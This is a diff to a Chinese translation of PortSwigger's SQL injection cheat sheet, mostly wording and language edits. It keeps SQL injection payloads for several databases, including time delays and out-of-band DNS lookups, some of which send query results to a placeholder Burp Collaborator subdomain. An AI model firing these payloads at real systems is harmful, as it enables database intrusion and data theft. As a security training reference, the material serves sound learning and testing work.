@@ -4,7 +4,7 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 
 # SQL注入备忘单
 
-这个SQL注入备忘单包含了一些有用的语法例子，您可以用来执行执行SQL注入攻击时经常出现的各种任务。
+这个[SQL注入](https://portswigger.net/web-security/sql-injection)备忘单包含了一些有用的语法例子，您可以用来执行执行SQL注入攻击时经常出现的各种任务。
 
 ### 字符串连接
 
@@ -74,11 +74,11 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 
 ### 批处理（或堆叠）查询
 
-您可以使用批处理查询来连续执行多个查询。请注意，虽然后续查询被执行，但结果不会返回给应用程序。因此，这种技术主要用于与盲目漏洞有关的情况，在这种情况下，您可以使用第二个查询来触发一个 DNS 查找、条件错误或时间延迟。
+您可以使用批处理查询来连续执行多个查询。请注意，虽然后续查询被执行，但结果不会返回给应用程序。因此，这种技术主要用于与盲目漏洞有关的情况，在这种情况下，您可以使用第二个查询来触发一个 DNS 查询、条件错误或时间延迟。
 
 | DataBases | Statements |
 | :--- | :--- |
-| Oracle | `Does not support batched queries.` |
+| Oracle | Does not support batched queries. |
 | Microsoft | `QUERY-1-HERE; QUERY-2-HERE` |
 | PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
 | MySQL | `QUERY-1-HERE; QUERY-2-HERE` |
@@ -109,18 +109,18 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 | PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
 | MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |
 
-### DNS查找
+### DNS查询
 
-您可以使数据库执行对外部域的 DNS 查找。要做到这一点，您需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以确认发生了 DNS 查找。
+您可以使数据库执行对外部域的 DN 查询。要做到这一点，您需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以确认发生了 DNS 查询。
 
 | DataBases | Statements |
 | :--- | :--- |
-| Oracle | The following technique leverages an XML external entity \([XXE](https://portswigger.net/web-security/xxe)\) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`  The following technique works on fully patched Oracle installations, but requires elevated privileges: `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')` |
+| Oracle | 以下技术利用XML外部实体（[XXE](https://portswigger.net/web-security/xxe)）漏洞来触发DNS查询。该漏洞已经打了补丁，但仍有许多未打补丁的Oracle安装。 `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual` 以下技术在打过补丁的Oracle中有效，但需要提升权限： `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')` |
 | Microsoft | `exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'` |
 | PostgreSQL | `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'` |
-| MySQL | The following techniques work on Windows only: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |
+| MySQL | 以下技术仅在Windows系统中有效： `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |
 
-### 带数据渗出的DNS查找
+### 带数据渗出的DNS查询
 
 您可以使数据库对包含注入查询结果的外部域进行 DNS 查询。要做到这一点，您需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以检索任何 DNS 交互的细节，包括被渗出的数据。
 
@@ -169,16 +169,11 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
     </tr>
     <tr>
       <td style="text-align:left">MySQL</td>
-      <td style="text-align:left">The following technique works on Windows only:
-        <br /><code>SELECT YOUR-QUERY-HERE INTO OUTFILE &apos;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&apos;</code>
+      <td style="text-align:left">&#x4EE5;&#x4E0B;&#x6280;&#x672F;&#x4EC5;&#x5728;Windows&#x7CFB;&#x7EDF;&#x4E2D;&#x6709;&#x6548;&#xFF1A;
+        <br
+        /><code>SELECT YOUR-QUERY-HERE INTO OUTFILE &apos;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&apos;</code>
       </td>
     </tr>
   </tbody>
 </table>
-
-
-
-
-
-
 
